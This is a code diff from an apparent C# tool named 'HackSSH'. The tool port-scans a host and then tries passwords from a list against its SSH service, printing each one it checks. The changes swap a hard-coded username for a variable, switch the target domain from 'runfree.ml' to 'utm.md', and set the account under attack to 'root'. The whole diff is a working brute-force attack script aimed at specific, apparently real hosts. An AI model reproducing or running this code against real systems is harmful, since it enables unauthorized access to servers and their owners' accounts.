@@ -84,9 +84,9 @@ namespace HackSSH
                     Console.WriteLine(++index);
                     Console.ForegroundColor = ConsoleColor.DarkMagenta;
                     Console.ResetColor();
-                    Console.WriteLine("Check for user=\"nicolae\" and password=\"" + pass.Value + "\"");
+                    Console.WriteLine("Check for user=\"" + user + "\" and password=\"" + pass.Value + "\"");
 
-                    CS = new SshClient(target, 22, "nicolae", pass.Value.ToString());
+                    CS = new SshClient(target, 22, user, pass.Value.ToString());
                     try
                     {
                         CS.Connect();
@@ -169,7 +169,7 @@ namespace HackSSH
         {
             IActions _actions = new Actions();
             _actions.Display("Is Time to hacking");
-            var target = "runfree.ml";
+            var target = "utm.md";
             var data = _actions.SendS1(target);
             var ports = _actions.GetPorts(data);
             _actions.Display("List of Ports");
@@ -179,7 +179,7 @@ namespace HackSSH
             }
             Console.Clear();
             _actions.Display("Start SSH");
-            _actions.SendS2(target, "nicolae");
+            _actions.SendS2(target, "root");
 
             while (Console.ReadLine() != "exit") { }
         }
